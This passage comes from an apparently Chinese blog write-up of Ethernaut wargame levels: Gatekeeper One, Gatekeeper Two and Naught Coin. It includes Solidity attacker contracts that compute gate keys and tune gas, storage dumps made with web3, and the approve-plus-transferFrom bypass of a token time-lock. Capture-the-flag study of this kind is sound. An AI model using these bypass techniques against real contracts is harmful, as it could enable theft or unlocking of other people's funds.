<p><a href="https://www.cnblogs.com/x-poior/p/10511552.html#:~:text=%E5%9C%A8%20Solidity%20%E4%B8%AD%EF%BC%8Ccall%20%E5%87%BD%E6%95%B0%E7%B0%87%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%90%88%E7%BA%A6%E7%9A%84%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%8C%85%E6%8B%AC%20call%E3%80%81delegatecall%20%E5%92%8C%20callcode%20%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E3%80%82,%3Caddress%3E.callcode%20%28...%29%20returns%20%28bool%29%20%3Caddress%3E.delegatecall%20%28...%29%20returns%20%28bool%29">callcode操作符</a>是在自己的上下文中执行代码，但是msg.sender会发生改变。<a href="https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall">ref</a></p>
<p>geth<a href="https://ethereum.stackexchange.com/questions/58108/opcodes-push-dup-and-swap">自定义的opcodes</a></p>
<p>Istanbul Fork<a href="https://medium.com/mycrypto/ethereums-istanbul-fork-technical-explanation-48a3aef718b0">新增的两个opcode</a></p>
<p>柏林升级前<a href="https://www.chainnews.com/articles/452289578010.htm">移除 EIP-2315</a></p>
<p>观察gateThree要求的条件，要求倒数第2 3个字节是0，要求高4个字节不为0，要求倒数1 2个字节是tx.origin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8c0d72c453b11E7507C4AcAA339004De5b1Ee3Be</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint64</span> <span style="color:#a6e22e">bts</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff00000000</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bts</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">uint160</span>(<span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">res</span>;
</span></span><span style="display:flex;"><span>        (<span style="color:#a6e22e">res</span>, ) <span style="color:#f92672">=</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">gas</span><span style="color:#f92672">:</span><span style="color:#ae81ff">254</span><span style="color:#f92672">+</span><span style="color:#ae81ff">81910</span>}(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeWithSignature</span>(<span style="color:#e6db74">&#34;enter(bytes8)&#34;</span>, <span style="color:#a6e22e">bytes8</span>(<span style="color:#a6e22e">bts</span>)));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">res</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;enter(): Attack Fail.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>254是用remix调试出来的。</p>
<h1 id="level-14-gatekeeper-two">Level 14. Gatekeeper Two<a hidden class="anchor" aria-hidden="true" href="#level-14-gatekeeper-two">#</a></h1>
<h2 id="source-8">Source<a hidden class="anchor" aria-hidden="true" href="#source-8">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">GatekeeperTwo</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">entrant</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">x</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assembly</span> { <span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(<span style="color:#a6e22e">caller</span>()) }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">uint64</span>(
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">bytes8</span>(
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>))
</span></span><span style="display:flex;"><span>				)
</span></span><span style="display:flex;"><span>			) <span style="color:#f92672">^</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">==</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">uint64</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">gateOne</span> <span style="color:#a6e22e">gateTwo</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">_gateKey</span>) <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">entrant</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>分析，需要在constructor中完成利用。</p>
<p>值得留意的事情：代码里<code>uint64(0) - 1</code>在0.8.0版本的编译器里会直接revert，好高级。自动溢出保护。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Hacker</span> {
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe7bdbFDaf1cddF5F16c81cB02FD49E57952E92FC</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// bytes public B;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// address x = address(new GatekeeperTwo());
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">uint64</span> <span style="color:#a6e22e">bts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">bytes8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#66d9ef">this</span>)))) <span style="color:#f92672">^</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#ae81ff">0xffffffffffffffff</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// bts ^= uint64(0xffffffffffffffff);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// bts ^= uint64(0) - 1;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">res</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// target = x;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">ret</span>;
</span></span><span style="display:flex;"><span>        (<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">ret</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeWithSignature</span>(<span style="color:#e6db74">&#34;enter(bytes8)&#34;</span>, <span style="color:#a6e22e">bytes8</span>(<span style="color:#a6e22e">bts</span>)));
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// B = ret;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">res</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#34;enter(): Attack Fail.&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">payable</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test</span> () <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">pure</span> <span style="color:#a6e22e">returns</span>(<span style="color:#a6e22e">uint64</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// return uint64(0) - 1; // this will revert !!!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">GatekeeperTwo</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">entrant</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>, <span style="color:#e6db74">&#34;gate 1&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">x</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assembly</span> { <span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(<span style="color:#a6e22e">caller</span>()) }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">x</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;gate 2&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">uint64</span>(
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">bytes8</span>(
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>))
</span></span><span style="display:flex;"><span>				)
</span></span><span style="display:flex;"><span>			) <span style="color:#f92672">^</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>) 
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">==</span> 
</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 		uint64(0) - 1, &#34;gate 3&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">gateOne</span> <span style="color:#a6e22e">gateTwo</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#a6e22e">_gateKey</span>) <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">entrant</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">bytes8</span> <span style="color:#a6e22e">_gateKey</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bytes8</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">bytes8</span>(<span style="color:#a6e22e">uint64</span>(
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">bytes8</span>(
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodePacked</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>))
</span></span><span style="display:flex;"><span>				)
</span></span><span style="display:flex;"><span>			) <span style="color:#f92672">^</span> <span style="color:#a6e22e">uint64</span>(<span style="color:#a6e22e">_gateKey</span>) );
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h1 id="level-15-naught-coin">Level 15. Naught Coin<a hidden class="anchor" aria-hidden="true" href="#level-15-naught-coin">#</a></h1>
<h2 id="source-9">Source<a hidden class="anchor" aria-hidden="true" href="#source-9">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">NaughtCoin</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">ERC20</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// string public constant name = &#39;NaughtCoin&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// string public constant symbol = &#39;0x0&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// uint public constant decimals = 18;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">timeLock</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">now</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">365</span> <span style="color:#a6e22e">days</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">INITIAL_SUPPLY</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">player</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_player</span>) 
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ERC20</span>(<span style="color:#e6db74">&#39;NaughtCoin&#39;</span>, <span style="color:#e6db74">&#39;0x0&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">player</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_player</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">INITIAL_SUPPLY</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">decimals</span>()));
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// _totalSupply = INITIAL_SUPPLY;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// _balances[player] = INITIAL_SUPPLY;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">_mint</span>(<span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">INITIAL_SUPPLY</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">emit</span> <span style="color:#a6e22e">Transfer</span>(<span style="color:#a6e22e">address</span>(<span style="color:#ae81ff">0</span>), <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">INITIAL_SUPPLY</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_to</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">_value</span>) <span style="color:#a6e22e">override</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">lockTokens</span> <span style="color:#a6e22e">returns</span>(<span style="color:#a6e22e">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">_to</span>, <span style="color:#a6e22e">_value</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Prevent the initial owner from transferring tokens until the timelock has passed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">lockTokens</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">player</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">now</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">timeLock</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">_</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } 
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></div><h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>In [3]: target = &#39;0x153cD5C206630Dbd726891f2aE5e6CF031460cfE&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [4]: w3.eth.get_storage_at(target,0)
</span></span><span style="display:flex;"><span>Out[4]: HexBytes(&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [5]: w3.eth.get_storage_at(target,1)
</span></span><span style="display:flex;"><span>Out[5]: HexBytes(&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [6]: w3.eth.get_storage_at(target,2)
</span></span><span style="display:flex;"><span>Out[6]: HexBytes(&#39;0x00000000000000000000000000000000000000000000d3c21bcecceda1000000&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [7]: w3.eth.get_storage_at(target,3)
</span></span><span style="display:flex;"><span>Out[7]: HexBytes(&#39;0x4e6175676874436f696e00000000000000000000000000000000000000000014&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [8]: w3.eth.get_storage_at(target,4)
</span></span><span style="display:flex;"><span>Out[8]: HexBytes(&#39;0x3078300000000000000000000000000000000000000000000000000000000006&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [9]: w3.eth.get_storage_at(target,5)
</span></span><span style="display:flex;"><span>Out[9]: HexBytes(&#39;0x0000000000000000000000000000000000000000000000000000000000000012&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [10]: w3.eth.get_storage_at(target,6)
</span></span><span style="display:flex;"><span>Out[10]: HexBytes(&#39;0x00000000000000000000000000000000000000000000000000000000735d4e82&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [11]: w3.eth.get_storage_at(target,7)
</span></span><span style="display:flex;"><span>Out[11]: HexBytes(&#39;0x00000000000000000000000000000000000000000000d3c21bcecceda1000000&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [12]: w3.eth.get_storage_at(target,8)
</span></span><span style="display:flex;"><span>Out[12]: HexBytes(&#39;0x0000000000000000000000009b3754c0a0798ade51e98c7a81ae73aacf9c2e5f&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [13]: bytes.fromhex(&#39;4e6175676874436f696e&#39;)
</span></span><span style="display:flex;"><span>Out[13]: b&#39;NaughtCoin&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [14]: 0x14/2
</span></span><span style="display:flex;"><span>Out[14]: 10.0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [15]: bytes.fromhex(&#39;307830&#39;)
</span></span><span style="display:flex;"><span>Out[15]: b&#39;0x0&#39;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [16]: w3.eth.get_storage_at(target,9)
</span></span><span style="display:flex;"><span>Out[16]: HexBytes(&#39;0x0000000000000000000000000000000000000000000000000000000000000000&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [18]: 1000000 * (10**18)
</span></span><span style="display:flex;"><span>Out[18]: 1000000000000000000000000
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>In [19]: hex(_)
</span></span><span style="display:flex;"><span>Out[19]: &#39;0xd3c21bcecceda1000000&#39;
</span></span></code></pre></div><p>合约一开头是继承的父合约ERC20的结构体变量，发现lockTokens这个修饰器对时间有要求。</p>
<p>但是ERC20可以转账的函数显然不止transfer一个函数。可以使用<code>approve+transferFrom</code>进行转账。</p>
<p>有地方需要注意的是，ERC20不允许向0地址转账&hellip;..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_transfer</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">sender</span>, <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">recipient</span>, <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">amount</span>) <span style="color:#a6e22e">internal</span> <span style="color:#a6e22e">virtual</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">sender</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">address</span>(<span style="color:#ae81ff">0</span>), <span style="color:#e6db74">&#34;ERC20: transfer from the zero address&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">recipient</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">address</span>(<span style="color:#ae81ff">0</span>), <span style="color:#e6db74">&#34;ERC20: transfer to the zero address&#34;</span>);
</span></span></code></pre></div><h2 id="exp-3">EXP<a hidden class="anchor" aria-hidden="true" href="#exp-3">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> web3.auto.infura.rinkeby <span style="color:#f92672">import</span> w3
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> eth_abi <span style="color:#f92672">import</span> encode_abi
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> w3<span style="color:#f92672">.</span>isConnected()
</span></span><span style="display:flex;"><span>
